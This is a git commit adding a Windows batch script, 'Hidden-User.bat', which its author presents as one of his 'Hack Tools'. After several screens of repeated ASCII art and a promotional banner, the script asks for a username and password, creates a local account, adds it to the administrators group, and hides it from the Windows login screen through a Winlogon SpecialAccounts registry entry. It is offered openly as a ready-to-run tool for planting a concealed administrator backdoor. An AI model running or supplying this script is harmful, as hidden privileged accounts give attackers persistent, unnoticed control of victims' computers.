4c3f171a571be1a8fff8a6b0b99d50c8d25336bc
Pir_Khorasani <48911411+mdkuhjani@users.noreply.github.com>
2026-02-10 12:56:47 +0330

    Add files via upload

---
+++ Hidden-User.bat
@@ -0,0 +1,231 @@
+Timeout 10
+echo off
+color 1
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+Timeout 4
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+cls
+:MENU
+ECHO. 
+ECHO                                                               :AA--:A7
+ECHO                                                             .---AA.:-
+ECHO                                                     A----AA------A----
+ECHO                                                     A-AA-A:AAAAAA-!A-A                               .---.
+ECHO                                           .:A-AA---.A-AAAA       AAAAAAA::::::::::::::.::::::::::.  A-:A-.
+ECHO                                         .A::AAA---!--!!-!!!!     !!!-!--AA77!!7??77!!7!7?7!!   !!A.-:   AA
+ECHO    A-AAA::::A:::::::::::AAA:AAA:::::.::AA:AA-!---!--AAA:AAAAAAA::A-!??-??7YY77?JJ?JJ??J?77?!!7!7?7!--   !A.   .    .         ..
+ECHO     --------AAAAAAAAAA:A:::::A::AAAA.:A-::AAAAAAAA--AAAAAAA--A-A-!!!!!-!!!!!AAA-AA-AAA-A:AA::::::AA-!!--!AAAAAAAAAAAAAAA::A::AA:::A:
+ECHO    !!!A:!!A:AA---AAA::::AAA::A:::::::::-AA::A      !!!7!AAA-A--AAAA-A-::::A:......:..............::A:..:AAA...................:::::.
+ECHO    -!!-:A::::A-AAAA-AAAAAA---A--      .AA-!7777!777??JJ?!!7-?7!!!-A::A:A:::A::::::::AA-AAAAAA:::::..    .:.
+ECHO    -77!!!!!!!---AAAAAAAA-AAAAAA.       ::A!!7777?????JYJ777-J!-----AAA           ..::A--AA::.
+ECHO    :7!!    ::--A::::::::::::.             -!-!!-  :A-  .:7-A-!77----::.      ..:A--!--AA:::
+ECHO    .!--   :--:                           A----!-!   A  ..A-!!7?!----AA:    :----AAA:::::..
+ECHO     -!-: AA:                           A-AAAAA:::A:::::::A-!-!?77!--AAA:     --A::::..
+ECHO     :!A-A:                           .-----AAAA           777Y!YJ-7?-AA      :...
+ECHO       ..                            :!!!---A::.           !?-Y7?J!!J-
+ECHO                                     !!!--A::A.            .7-77-J7A!7:
+ECHO                                     A-----AA:              -!-7-!?-A7!
+ECHO                                        ....:.              .!A-!A-!AA!A
+ECHO                                                             :-AAAA-A:AA
+ECHO                                                              AA.:...
+ECHO. 
+Timeout 5
+color A
+ECHO. 
+ECHO                                        ................................................................................... 
+ECHO. 
+ECHO                                                             Hack Tools - Craeated By Pir_Khorasani
+ECHO.
+ECHO                                                     Youtube Channel : https://www.youtube.com/@Pir_Khorasani
+ECHO.
+ECHO                                                  Instagram Channel : https://www.instagram.com/pirkhorasani
+ECHO.
+ECHO                                                                   Email : mdkuhjani@gmail.com
+ECHO.
+ECHO                                                                     WhatsApp : +989225312701
+ECHO.                                   
+ECHO                                         ................................................................................... 
+ECHO. 
+color A
+cd\
+REM "Make HiddenUser"
+REM ------------------------------
+set /p user=Hidden_User:
+set /p pass=Password:
+net user /add %user% %pass%
+net localgroup administrators /add %user%
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0
+pause
